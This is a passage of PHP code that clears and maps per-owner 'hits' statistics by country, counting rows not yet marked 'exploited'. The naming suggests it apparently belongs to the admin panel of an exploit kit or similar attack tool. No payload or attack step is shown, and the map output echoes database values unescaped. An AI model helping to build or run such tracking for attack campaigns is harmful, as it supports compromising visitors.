                                    </tr>';
        return true;
    } else {
        return false;
    }
}

function clear_stats() {
    global $dbh;
    $stmt = $dbh->prepare("DELETE FROM hits WHERE owner = ?");
    $stmt->execute(array($_SESSION['id']));
}

function show_map() {
    global $dbh;
    $stmt = $dbh->prepare('SELECT country, COUNT(*) AS magnitude FROM hits WHERE owner = ?  AND exploited = 0 GROUP BY country ORDER BY magnitude DESC LIMIT 250');
    $stmt->execute(array($_SESSION['id']));
    $countries = $stmt->fetchAll();

    foreach ($countries as $country) {
        echo '  {
                    id: "'.$country['country'].'",
                    value: '.$country['magnitude'].'
                },';
    }
}

?>
